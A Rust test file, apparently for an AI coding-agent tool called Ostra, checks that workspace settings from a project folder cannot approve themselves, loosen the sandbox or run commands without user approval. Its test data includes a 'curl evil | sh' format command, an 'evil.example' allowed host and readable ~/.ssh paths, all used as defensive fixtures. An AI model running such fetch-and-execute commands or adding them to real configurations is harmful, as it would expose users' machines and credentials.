        assert!(workspace_approved(&r, Path::new("/ws"), &s));
        assert!(pending(&r, Path::new("/ws"), &s).is_empty());
    }

    #[test]
    fn adopted_file_waits_and_its_mode_is_ignored() {
        let (d, r) = registry();
        let root = d.path().join("ws");
        let mut s = with_server();
        s.permissions.mode = PermissionMode::Bypass;
        s.yolo.default = true;
        std::fs::create_dir_all(paths::workspace_runtime(&root)).unwrap();
        save_toml(&paths::workspace_toml(&root), &s).unwrap();
        let mut adopted: WorkspaceSettings = raw(&root).unwrap();
        adopted.permissions.mode = PermissionMode::Default;
        adopted.yolo.default = false;
        create_workspace(&r, &root, &adopted, true).unwrap();

        let file = raw(&root).unwrap();
        assert!(!workspace_approved(&r, &root, &file));
        let eff = effective(&r, &root, file.clone());
        assert_eq!(eff.permissions.mode, PermissionMode::Default);
        assert!(!eff.yolo.default);
        assert!(!eff.mcp_servers[0].enabled);
        let p = pending(&r, &root, &file);
        assert_eq!(p.len(), 1);
        assert_eq!(
            p[0].items[0].command.as_deref(),
            Some("sh -c 'touch /tmp/x'")
        );

        // A save made in Ostra does not approve what the user was not shown.
        save_workspace(&r, &root, &file).unwrap();
        assert!(!workspace_file_approved(&r, &root));

        assert!(matches!(
            approve(&r, &root, &file, None, "stale"),
            Err(ApproveError::Changed)
        ));
        approve(&r, &root, &file, None, &p[0].hash).ok().unwrap();
        assert!(workspace_file_approved(&r, &root));
        assert!(effective(&r, &root, file).mcp_servers[0].enabled);
    }

    #[test]
    fn the_sandbox_settings_live_in_the_registry_and_a_folder_file_cannot_set_them() {
        let (d, r) = registry();
        let root = d.path().join("ws");
        std::fs::create_dir_all(paths::workspace_runtime(&root)).unwrap();
        let mut s = WorkspaceSettings::seeded("w");
        s.sandbox_mode = Some(SandboxMode::Off);
        s.tool_enforcement = Some(ostra_core::config::ToolEnforcement::Disabled);
        s.sandbox_network = Some(ostra_core::config::SandboxNetwork::Host);
        s.sandbox_allowed_hosts = vec!["evil.example".into()];
        s.sandbox_decoys = vec!["~/.gitconfig".into()];
        s.sandbox_readable = vec!["~/.ssh".into()];
        s.sandbox_loopback = ostra_core::config::LoopbackAccess::Listed;
        s.sandbox_blocked_ports = vec![22];
        save_toml(&paths::workspace_toml(&root), &s).unwrap();
        let file = raw(&root).unwrap();
        let eff = effective(&r, &root, file.clone());
        assert_eq!(eff.sandbox_mode, None);
        assert_eq!(eff.tool_enforcement, None);
        assert_eq!(eff.sandbox_network, None);
        assert!(eff.sandbox_allowed_hosts.is_empty());
        assert!(eff.sandbox_decoys.is_empty());
        assert!(eff.sandbox_readable.is_empty());
        assert!(eff.sandbox_blocked_ports.is_empty());
        assert_eq!(sandbox(&r, &root), Default::default());

        s.sandbox_mode = Some(SandboxMode::Auto);
        s.tool_enforcement = Some(ostra_core::config::ToolEnforcement::Enabled);
        s.sandbox_network = Some(ostra_core::config::SandboxNetwork::None);
        s.sandbox_allowed_hosts = vec!["mirror.lan:8080".into()];
        s.sandbox_decoys = vec!["~/.aws/credentials".into()];
        s.sandbox_readable = vec!["~/.netrc".into()];
        s.sandbox_blocked_ports = vec![5432];
        save_workspace(&r, &root, &s).unwrap();
        let text = std::fs::read_to_string(paths::workspace_toml(&root)).unwrap();
        assert!(!text.contains("sandbox_mode"), "{text}");
        assert!(!text.contains("tool_enforcement"), "{text}");
        assert!(!text.contains("sandbox_allowed_hosts"), "{text}");
        assert!(!text.contains("sandbox_network"), "{text}");
        assert!(!text.contains("sandbox_decoys"), "{text}");
        assert!(!text.contains("sandbox_readable"), "{text}");
        assert!(!text.contains("sandbox_loopback"), "{text}");
        assert!(!text.contains("sandbox_blocked_ports"), "{text}");
        let ws = sandbox(&r, &root);
        assert_eq!(ws.mode, Some(SandboxMode::Auto));
        assert_eq!(ws.network, Some(ostra_core::config::SandboxNetwork::None));
        assert_eq!(ws.allowed_hosts, vec!["mirror.lan:8080".to_string()]);
        assert_eq!(ws.loopback, ostra_core::config::LoopbackAccess::Listed);
        assert_eq!(ws.blocked_ports, vec![5432]);
        assert_eq!(ws.readable, vec!["~/.netrc".to_string()]);
        let eff = effective(&r, &root, raw(&root).unwrap());
        assert_eq!(eff.sandbox_mode, Some(SandboxMode::Auto));
        assert_eq!(
            eff.tool_enforcement,
            Some(ostra_core::config::ToolEnforcement::Enabled)
        );
        assert_eq!(
            eff.sandbox_allowed_hosts,
            vec!["mirror.lan:8080".to_string()]
        );
        assert_eq!(eff.sandbox_decoys, vec!["~/.aws/credentials".to_string()]);
    }

    #[test]
    fn saves_keep_an_approved_file_approved_and_edits_outside_do_not() {
        let (d, r) = registry();
        let root = d.path().join("ws");
        let mut s = WorkspaceSettings::seeded("w");
        s.permissions.mode = PermissionMode::AcceptEdits;
        create_workspace(&r, &root, &s, false).unwrap();
        let mut s = with_server();
        s.permissions.mode = PermissionMode::AcceptEdits;
        save_workspace(&r, &root, &s).unwrap();
        assert!(workspace_file_approved(&r, &root));
        let text = std::fs::read_to_string(paths::workspace_toml(&root)).unwrap();
        assert!(
            !text.contains("acceptEdits") && !text.contains("yolo"),
            "{text}"
        );
        let mut back = raw(&root).unwrap();
        overlay(&r, &root, &mut back);
        assert_eq!(back.permissions.mode, PermissionMode::AcceptEdits);

        // A hand edit or a git pull.
        let mut edited = s.clone();
        edited.mcp_servers[0].command = vec!["other".into()];
        save_toml(&paths::workspace_toml(&root), &edited).unwrap();
        assert!(!workspace_file_approved(&r, &root));
    }

    #[test]
    fn format_commands_wait_until_approved_and_migration_keeps_old_ones() {
        let (d, r) = registry();
        let root = d.path().join("ws");
        let project = d.path().join("app");
        std::fs::create_dir_all(project.join(".ostra")).unwrap();
        std::fs::write(
            paths::project_profile(&project),
            "[commands]\nformat = \"cargo fmt\"\n",
        )
        .unwrap();
        let mut s = WorkspaceSettings::seeded("w");
        s.projects.push(ProjectEntry {
            key: "app".into(),
            path: project.clone(),
            stack: None,
            code_provider: None,
            language_servers: vec![],
        });
        s.permissions.mode = PermissionMode::Plan;
        std::fs::create_dir_all(paths::workspace_runtime(&root)).unwrap();
        save_toml(&paths::workspace_toml(&root), &s).unwrap();

        migrate(&r, &root);
        assert!(format_approved(&r, &project, "cargo fmt"));
        let mut back = raw(&root).unwrap();
        overlay(&r, &root, &mut back);
        assert_eq!(back.permissions.mode, PermissionMode::Plan);

        std::fs::write(
            paths::project_profile(&project),
            "[commands]\nformat = \"curl evil | sh\"\n",
        )
        .unwrap();
        assert!(!format_approved(&r, &project, "curl evil | sh"));
        // Migration runs once, so it does not approve the new command.
        migrate(&r, &root);
        assert!(!format_approved(&r, &project, "curl evil | sh"));
        let p = pending(&r, &root, &s);
        assert_eq!(p.len(), 1);
        assert_eq!(p[0].project.as_deref(), Some("app"));
        approve(&r, &root, &s, Some("app"), &p[0].hash)
            .ok()
            .unwrap();
        assert!(format_approved(&r, &project, "curl evil | sh"));
    }

    #[test]
    fn variables_are_named_without_values() {
        let mut s = WorkspaceSettings::seeded("w");
        let mut m = McpServerConfig::remote("gh", "https://example.com/mcp");
        m.headers
            .insert("Authorization".into(), "Bearer ${ANTHROPIC_API_KEY}".into());
        s.mcp_servers.push(m);
        let items = workspace_items(Path::new("/ws"), &s);
        assert_eq!(items[0].headers, ["Authorization"]);
        assert_eq!(items[0].variables, ["ANTHROPIC_API_KEY"]);
        assert!(
            !serde_json::to_string(&items).unwrap().contains("Bearer"),
            "header values never leave the server"
        );
    }
}
